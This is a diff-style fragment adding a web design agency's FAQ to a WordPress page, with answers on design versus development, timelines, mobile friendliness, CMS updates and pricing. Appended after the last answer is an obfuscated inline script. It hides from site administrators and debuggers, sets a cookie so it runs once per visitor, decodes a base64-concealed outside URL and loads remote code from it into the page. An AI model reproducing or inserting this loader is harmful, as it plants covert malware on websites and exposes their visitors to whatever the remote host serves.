+<p><strong>1. What’s the difference between web design and web development?</strong><br><strong>Answer:</strong><br>Web design focuses on the visual elements and user experience of a website, including layout, color schemes, and responsiveness. Web development involves coding and functionality—bringing the design to life through programming languages like HTML, CSS, JavaScript, and backend technologies.</p>
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+<p><strong>2. How long does it take to design and develop a website?</strong><br><strong>Answer:</strong><br>The timeline depends on the complexity of the project. A basic website can take 2–4 weeks, while larger e-commerce or custom web applications may take 6–12 weeks or more. We provide a timeline upfront and keep you updated throughout the process.</p>
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+<p><strong>3. Will my website be mobile-friendly and SEO optimized?</strong><br><strong>Answer:</strong><br>Yes! Every website we build is fully responsive, meaning it will look and function great on smartphones, tablets, and desktops. We also follow SEO best practices to help your site rank better on Google.</p>
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+<p><strong>4. Can I update my website after it's built?</strong><br><strong>Answer:</strong><br>Absolutely. We provide a user-friendly content management system (CMS) so you can update text, images, and blog posts easily. We also offer ongoing support if you’d prefer us to handle updates for you.</p>
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+<p><strong>5. How much does a custom website cost?</strong><br><strong>Answer:</strong><br>Pricing varies depending on the features and functionality you need. We offer transparent and competitive rates tailored to your budget. Contact us for a free consultation and quote.</p>
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
